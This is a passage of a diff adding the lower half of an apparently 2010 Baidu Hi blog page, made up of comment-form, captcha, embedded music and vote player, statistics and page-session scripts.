+		while(p && p.nodeType != 1) p = p.previousSibling;
+
+		if(p && /bdeditor_container/.test(p.id)){
+
+			p.parentNode.removeChild(p);
+
+		}
+
+		spBlogCmtText.style.display = '';
+
+		editor=null;
+
+	}
+
+</script>
+
+
+
+<script>
+
+G("spBlogCmtor").value=G("spBlogCmtor").defaultValue;
+
+G("spBlogCmtText").value="";
+
+</script>
+
+</td>
+
+</tr>
+
+<tr id="3_err" style="display:none">
+
+<td>&nbsp;</td>
+
+<td><div class="error" id="3_err_con"></div></td>
+
+</tr>
+
+
+
+<tr id="vercode">
+
+<td valign="top" class="f14">验证码：</td>
+
+<td valign="top"><input type="hidden" name="spVcode" value="" />
+
+<input type="text" onFocus="f_focus()" id="spVerifyKey" name="spVerifyKey" size="6"  maxlength="4" autocomplete="off" tabindex="4">  请点击后输入四位验证码，字母不区分大小写<br/>
+
+<script type="text/javascript">
+
+/*<![CDATA[*/
+
+
+function f_focus(){
+	getVcode();
+}
+function getVcode(){
+	var url="http://hi.baidu.com/sys/file/getvcode?echoback=getVcodeDone&t="+(new Date().getTime());
+	BdAjax.loadJS(url)
+}
+
+function getVcodeDone(vcode){
+	document.form1.spVcode.value=vcode;
+	var imgsrc="http://hiup.baidu.com/cgi-bin/genimg?"+vcode;
+	G('verifypic').src=imgsrc;
+	G('yanzheng').style.display="block";
+}
+function newverifypic(){
+	getVcode();
+	return false;
+}
+
+/*]]>*/
+
+</script>
+
+<div id="yanzheng" style="display:none">
+
+<img id='verifypic' width='120' height='40'><wbr /><a onFocus="this.blur();" href="#" onClick="return newverifypic();" title="看不清左边的字符" >看不清?</a>
+
+</div>
+
+</td>
+
+</tr>
+
+
+
+
+
+<tr>
+
+<td valign="top"class="f14">&nbsp;</td>
+
+<td valign="top" class="f14"><input id="btn_ok" name="btn_ok" type="submit" value="发表评论" tabindex=5>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" id="cancleReLink" onClick="canclereply(); return false;" style="display:none; font-size:12px;color:#666;">取消回复</a></td>
+
+</tr>
+
+</table>
+
+</form>
+
+</div>
+
+
+
+
+
+
+
+
+
+<br>
+
+</div>
+
+
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0" height="8">
+
+<tr><td class="modbl" width="7">&nbsp;</td>
+
+<td class="modbc">&nbsp;</td>
+
+<td class="modbr" width="7">&nbsp;</td>
+
+</tr></table>
+
+
+
+
+
+
+
+
+
+</div>
+
+</div>
+
+
+
+</div>
+
+
+
+</div>
+
+
+<script src="/fc/editor/dialog/fck_music/swf.js?v=1.0.js"></script>
+<script src="/fc/editor/dialog/fck_music/fck_music_auto.js?v=1.0.js"></script>
+
+<script src="/js/bgmusic.js?v=1.0.js" language="javascript"></script>
+<script language="javascript">
+function initBlogTextForFCK(){
+	//fck init music
+	if(window.Node){Node.prototype.replaceNode=function(Node){this.parentNode.replaceChild(Node,this);}}
+	var imgBox=document.getElementsByName('musicName');
+	var isAutoPlay=true;
+	for(var i=0,n=imgBox.length;i<n;i++){
+		var img=imgBox[i];
+		if(img.getAttribute('rel')){
+			var musicSrc=img.getAttribute('rel');
+			var musicDiv = document.createElement("SPAN");
+			var tmp=musicSrc.substr (musicSrc.indexOf('#')+1, 1);
+			var tmpAutoPlay=(tmp=='1');
+			if(isAutoPlay&&tmpAutoPlay){
+				isAutoPlay=false;
+				tmpAutoPlay=true;
+			}else{
+				tmpAutoPlay=false;
+			}
+			var shtml=creatbgmusic(musicSrc.substr(0,musicSrc.indexOf('#')),1,true,false,tmpAutoPlay,tmpAutoPlay,'FckMusicHelper');
+			shtml=shtml.replace('width=100%','width=200').replace('width="100%"','width=200 height=45');			img.replaceNode(musicDiv);
+			musicDiv.innerHTML=shtml;
+			i--;n--;
+		}
+	}
+		//fck init vote
+	!function(){
+		var vote = document.getElementsByName('FCK_VOTE');
+		for(var i=0,len=vote.length,item,rel=0,cdiv;i<len;i++){
+			item = vote[0];
+			rel = item.getAttribute('rel')|0;
+			if(rel){
+				cdiv = document.createElement('span');
+				item.parentNode.replaceChild(cdiv,item);
+				baidu.swf.create({
+					"id": "VOTE_FLASH_"+i,
+					"width" : "585",
+					"height": "100",
+					"ver"   : "9.0.0",
+					"wmode" : document.all ? "opaque" : "window",
+					"allowscriptaccess" : "always",
+					"url"   : "http://static.hi.baidu.com/apps/appvote/spaceVote.swf?vote_id="+rel
+				},cdiv)
+
+			}
+		}
+	}()
+	//document.getElementById('blog_text').style.display='';
+}
+
+</script>
+
+<script language="javascript">
+
+<!--
+
+var hstr="/mj0011/brwstat?key1=1";
+
+document.write("<script src='"+hstr+"&key2="+allkey+"'><\/script>");
+
+//-->
+
+</script>
+
+<br><center><div id="ft">&copy;2010 Baidu</div></center>
+
+
+
+<script>
+
+if(document.getElementById("m_blog"))
+
+{
+
+	var imgarray = document.getElementById("m_blog").getElementsByTagName('img');
+
+	var imgw = document.getElementById("m_blog").offsetWidth;
+
+	imgw =imgw-40;
+
+    for(var i=0; i<imgarray.length; i++){
+    	if(imgarray[i].className=="blogimg" && imgarray[i].width>=imgw) {
+	    	imgarray[i].width=imgw;
+        }
+    }
+}
+
+
+
+// Fix ff bugs
+
+var blog_text = document.getElementById('blog_text');
+
+blog_text.innerHTML = blog_text.innerHTML.replace(/href\s*=\s*("|')?(\.\.\/\.\.\/)/gi,"href=$1../$2");
+
+
+initBlogTextForFCK();
+gotoreply();
+
+</script>
+
+</center>
+
+
+
+
+
+<img src="http://c.baidu.com/c.gif?t=6&p=3" style="display:none;"/>
+<iframe id="submitiframe" name="submitiframe" src="/st/blank.html" style="display:none;"></iframe>
+
+			
+
+
+<script type="text/javascript">
+/*<![CDATA[*/
+
+var SP = SP || {};
+if(!SP.mycard){
+    SP.mycard = new (function(){
+        var me = this;
+        var _cancleAction = Session.isDrag;  
+        var _list = [];
+        var _sourceLoaded = false;    
+        me.bind = function (_id){
+            if(_cancleAction){  //abort
+                return;
+            }
+            if(!_sourceLoaded){
+                _list.push(_id);
+            } else {
+                baidu.space.mycard.bind(_id);
+            }
+        }
+        me.init = function (_config){
+            _cancleAction = !!_config.cancle;
+        }
+        me.onSourceLoaded = function (){
+            _sourceLoaded = true;
+            baidu.space.mycard.init({portrait: Session.visitorPortrait});
+            for(var i=0,len=_list.length; i<len; i++){
+                baidu.space.mycard.bind(_list[i]);
+            }
+        }
+    })();
+    baidu.dom.ready(function(){
+        BdAjax.loadCSS('/ui/css/ucard/ucard.css?v=020507100.css');
+        BdAjax.loadJS('/ui/scripts/ucard/ucard.js?v=020507100.js');
+    });
+}
+SP.mycard.bind('m_blog');  
+/*]]>*/
+</script>
+
+
+	<script type="text/javascript" src="/ui/scripts/refer/refer.js"></script>
+	
+<link rel="stylesheet" type="text/css" href="/ui/css/userset.css" />
+<link rel="stylesheet" type="text/css" href="/ui/css/beautify/widget.css" />
+
+<script type="text/javascript" src="http://hi.baidu.com/hi/cms/article/beautifyconfig/default_user_suit.js"></script>
+
+<script type="text/javascript">
+//页面状态变量
+var Session = Session || {
+    spaceURL: "/mj0011",
+    pageURL: "http://hi.baidu.com/mj0011/blog/item/8eb590cba79fe0f152664fa4%2Ehtml",    //当前访问的url
+    isHost: "",         // 是否是空间主人
+    userName: "MJ0011",   // 空间主人用户名
+    userNameEnc:    "MJ0011", 
+    visitorName:    "",
+    visitorURL: "/index.html",        // 
+    refer: "",
+    spBasicURL:"mj0011",
+    spBasicURLEnc:"mj0011"
+};
+</script>
+<script src="http://img.baidu.com/js/tangram-1.1.0.js" type="text/javascript"></script>
+<script src="/ui/scripts/beautify/render.js" type="text/javascript"></script>
+<script type="text/javascript">
+baidu.dom.ready(function(){
+    if(typeof spBeautifyConfigData != 'undefined'){
+        var _installList = spBeautifyConfigData.list;
+    } else {
+        spBeautifyConfigData = {};
+        _installList = [];
+    }
+    spBeautifyConfigData.currentDate  = Math.round((new Date('2010/04/24')).getTime() / 1000);    
+    BeautifyWidget.init({timeStamp: spBeautifyConfigData.currentDate, env: 'sys'});
+    BeautifyWidget.render(_installList);
+});
+</script>
+
+
+
+<script type="text/javascript" src="http://hi.baidu.com/hi/cms/article/quickjs/auto.js"></script>
+<script>try{SCD.init("")}catch(e){}</script>
+
+
+
+
+</body></html>
